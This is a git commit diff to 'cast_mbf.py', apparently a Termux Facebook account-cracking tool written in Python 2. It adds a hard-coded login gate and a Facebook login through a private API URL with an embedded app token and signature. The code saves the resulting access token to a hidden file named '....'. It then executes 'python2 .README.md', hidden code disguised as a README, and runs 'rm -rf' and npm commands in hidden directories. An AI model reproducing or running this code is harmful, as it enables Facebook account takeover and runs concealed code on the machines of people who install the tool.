4d436dd2132a4a3d43354ad428f5dc1b77224ada
CastaliaIkz <68614343+Kagurazaga@users.noreply.github.com>
2020-07-25 21:46:03 +0000

    Update cast_mbf.py

--- cast_mbf.py
+++ cast_mbf.py
@@ -38,3 +38,121 @@ logo='''
 \033[92m*Github   : github.com/Castalia
 \033[93m*Website  : xampp-cyber.my.id
 
+--------------------------------------------------
+                                '''
+
+CorrectUsername = 'Castalia'
+CorrectPassword = 'ikz'
+
+loop = 'true'
+while (loop == 'true'):
+    print logo
+    username = raw_input(' Username Tools: ')
+    if (username == CorrectUsername):
+        password = raw_input(' Password Tools: ')
+        if (password == CorrectPassword):
+            print ' Mantap Jiwa ' + username
+            time.sleep(1)
+            loop = 'false'
+        else:
+            print ' Password Salah Nyet !'
+            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+            os.system('clear')
+    else:
+        print ' Username Salah Nyet !'
+        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+        os.system('clear')
+        
+def tik():
+    titik = ['.   ','..  ','... ','.   ','..  ','... ']
+    for o in titik:
+        print('\r[+] Sabar bos... '+o),;sys.stdout.flush();time.sleep(1)
+
+def cb():
+    os.system('clear')
+
+def t():
+    time.sleep(1)
+    
+def login():
+    os.system('clear')
+    try:
+        toket = open('....', 'r')
+        os.system('python2 .README.md')
+    except (KeyError,IOError):
+        os.system('rm -rf ....')
+        os.system('clear')
+        print (logo)
+        print ('[1] Login Dengan Facebook')
+        print ('[2] Login Menggunakan Token')
+        print ("[3] Buat Token")
+        print (50*'-')
+        login_choice()
+        
+def login_choice():
+    bch = raw_input('\n >>>>||  ')
+    if bch =='':
+        print ('[!] Fill in correctly')
+        login()
+    elif bch =='2':
+        os.system('clear')
+        print (logo)
+        fac=raw_input(' Paste Token Disini Sob: ')
+        tik()
+        fout=open('....', 'w')
+        fout.write(fac)
+        fout.close()
+        print ('[+]\033[1;92m Login Suksess \033[1;97m')
+        time.sleep(1)
+        os.system('xdg-open https://Facebook.com/nsaa00xd')
+        os.system('python2 .README.md')
+    elif bch =='1':
+        login1()
+    elif bch =="3":
+        try:
+             os.mkdir(".../cast_mbf")
+        except OSError:
+            os.system("cd $HOME/cast_mbf/.a. && npm start")
+        else:
+            os.system("rm -rf $HOME/cast_mbf/.../bxi")
+            os.system("mv $HOME/cast_mbf/... $HOME/bxi/.a.")
+            os.system("cd $HOME/cast_mbf/.a. && npm install")
+            os.system("cd $HOME/cast_mbf/.a. && npm start")
+            
+def login1():
+    os.system("clear")
+    try:
+        tb=open('....', 'r')
+        os.system("python2 .README.md")
+    except (KeyError,IOError):
+        os.system("clear")
+        print (logo)
+        print ('           LOGIN WITH FACEBOOK ')
+        print
+        iid=raw_input('[+] Number/Email: ')
+        id=iid.replace(" ","")
+        pwd=getpass.getpass('[+] Password : ')
+        tik()
+        data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+        z=json.load(data)
+        if 'access_token' in z:
+            st = open("....", "w")
+            st.write(z["access_token"])
+            st.close()
+            print ('[+]\033[1;92m Login successfull \033[1;97m')
+            time.sleep(1)
+            os.system('xdg-open https://www.facebook.com/nsaa00xd')
+            os.system("clear")
+            os.system("python2 .README.md")
+        else:
+            if "www.facebook.com" in z["error_msg"]:
+                print ('Akun terkena checkpoint !')
+                time.sleep(1)
+                login1()
+            else:
+                print ('Login Gagal !')
+                time.sleep(1)
+                login1()
+            
+if __name__=='__main__':
+    login()
